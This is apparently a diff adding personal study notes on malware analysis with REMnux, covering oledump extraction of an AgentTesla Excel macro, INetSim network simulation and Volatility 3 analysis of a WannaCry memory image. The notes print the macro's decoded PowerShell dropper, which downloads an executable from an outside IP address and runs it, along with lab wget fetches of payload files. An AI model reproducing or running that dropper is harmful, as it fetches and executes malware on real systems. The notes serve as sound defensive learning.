@@ -289,6 +289,273 @@ What clicked for me: CAPA isn't guessing behavior from vibes — every single ca
 
 
 
+Hands-on notes from learning malware analysis using the **REMnux VM**.
+
+## What I learned
+
+I worked with REMnux and practiced analysing suspicious documents, simulated network activity, and Windows memory captures.
+
+### Tools I used
+
+* REMnux
+* `oledump.py`
+* CyberChef
+* INetSim
+* Volatility 3
+* Linux `strings`
+* PowerShell
+* Bash
+
+---
+
+##  Static Analysis with oledump
+
+I analysed a malicious Excel file:
+
+```text
+agenttesla.xlsm
+```
+
+I first checked the OLE streams:
+
+```bash
+oledump.py agenttesla.xlsm
+```
+
+I found a VBA project and identified the macro stream:
+
+```text
+VBA/ThisWorkbook
+```
+
+I extracted the macro with:
+
+```bash
+oledump.py agenttesla.xlsm -s 4 --vbadecompress
+```
+
+The macro used:
+
+```vb
+Private Sub Workbook_Open()
+```
+
+and created a `WScript.Shell` object to execute a command.
+
+The PowerShell command was obfuscated using `*` and `^`. I used **CyberChef** to remove those characters and understand the actual command.
+
+The decoded command:
+
+```powershell
+powershell -WindowStyle hidden -executionpolicy bypass;
+$TempFile = [IO.Path]::GetTempFileName() |
+Rename-Item -NewName { $_ -replace 'tmp$', 'exe' } PassThru;
+Invoke-WebRequest -Uri "http://193.203.203.67/rt/Doc-3737122pdf.exe"
+-OutFile $TempFile;
+Start-Process $TempFile;
+```
+
+From this I learned how a malicious document can:
+
+```text
+Excel file
+   ↓
+VBA macro
+   ↓
+Obfuscated PowerShell
+   ↓
+Download executable
+   ↓
+Execute payload
+```
+
+---
+
+## 2. Dynamic Analysis with INetSim
+
+I used **INetSim** to simulate Internet services in an isolated environment.
+
+I configured:
+
+```text
+/etc/inetsim/inetsim.conf
+```
+
+and set:
+
+```text
+dns_default_ip 10.112.165.39
+```
+
+Then started the simulation:
+
+```bash
+sudo inetsim
+```
+
+I tested simulated downloads using:
+
+```bash
+sudo wget https://10.112.165.39/second_payload.zip --no-check-certificate
+```
+
+and:
+
+```bash
+sudo wget https://10.112.165.39/second_payload.ps1 --no-check-certificate
+```
+
+I also learned how to inspect the generated connection report:
+
+```bash
+sudo cat /var/log/inetsim/report/report.2594.txt
+```
+
+This showed requests such as:
+
+```text
+GET /
+GET /test.exe
+GET /second_payload.ps1
+GET /second_payload.zip
+```
+
+This helped me understand how malware network behaviour can be observed safely using a simulated Internet.
+
+---
+
+## 3. Windows Memory Analysis with Volatility 3
+
+I analysed:
+
+```text
+wcry.mem
+```
+
+using several Volatility plugins.
+
+### Process tree
+
+```bash
+vol3 -f wcry.mem windows.pstree.PsTree
+```
+
+### Process list
+
+```bash
+vol3 -f wcry.mem windows.pslist.PsList
+```
+
+### Command lines
+
+```bash
+vol3 -f wcry.mem windows.cmdline.CmdLine
+```
+
+### File objects
+
+```bash
+vol3 -f wcry.mem windows.filescan.FileScan
+```
+
+### Loaded DLLs
+
+```bash
+vol3 -f wcry.mem windows.dlllist.DllList
+```
+
+### Suspicious memory regions
+
+```bash
+vol3 -f wcry.mem windows.malfind.Malfind
+```
+
+### Process scanning
+
+```bash
+vol3 -f wcry.mem windows.psscan.PsScan
+```
+
+I encountered processes such as:
+
+```text
+tasksche.exe
+taskse.exe
+taskdl.exe
+@WanaDecryptor@
+```
+
+The process tree, command lines and process scanning helped me understand how different Volatility plugins provide different views of the same memory image.
+
+---
+
+## 4. Automating Volatility
+
+Instead of running every plugin manually, I learned how to process several plugins using a Bash loop:
+
+```bash
+for plugin in windows.malfind.Malfind windows.psscan.PsScan \
+windows.pstree.PsTree windows.pslist.PsList \
+windows.cmdline.CmdLine windows.filescan.FileScan \
+windows.dlllist.DllList; do
+    vol3 -q -f wcry.mem $plugin > wcry.$plugin.txt
+done
+```
+
+This creates separate `.txt` files containing the results.
+
+---
+
+## 5. Extracting Strings
+
+I also learned how to preprocess a memory image with `strings`:
+
+```bash
+strings wcry.mem > wcry.strings.ascii.txt
+```
+
+```bash
+strings -e l wcry.mem > wcry.strings.unicode_little_endian.txt
+```
+
+```bash
+strings -e b wcry.mem > wcry.strings.unicode_big_endian.txt
+```
+
+This extracts ASCII, little-endian Unicode and big-endian Unicode strings for easier searching and analysis.
+
+---
+
+## What I took away
+
+The main thing I learned was to follow the complete chain instead of looking at only one indicator:
+
+```text
+File
+ ↓
+Macro
+ ↓
+Obfuscation
+ ↓
+PowerShell
+ ↓
+Network activity
+ ↓
+Payload
+ ↓
+Memory
+ ↓
+Processes / Files / DLLs / Strings
+```
+
+I also learned the importance of **preprocessing evidence** so that large amounts of forensic data can be searched and analysed more efficiently.
+
+### Main tools practiced
+
+`REMnux` • `oledump.py` • `CyberChef` • `INetSim` • `Volatility 3` • `strings` • `PowerShell` • `Bash`
+
+
+
 # 4. FlareVM: Arsenal of Tools
 
 
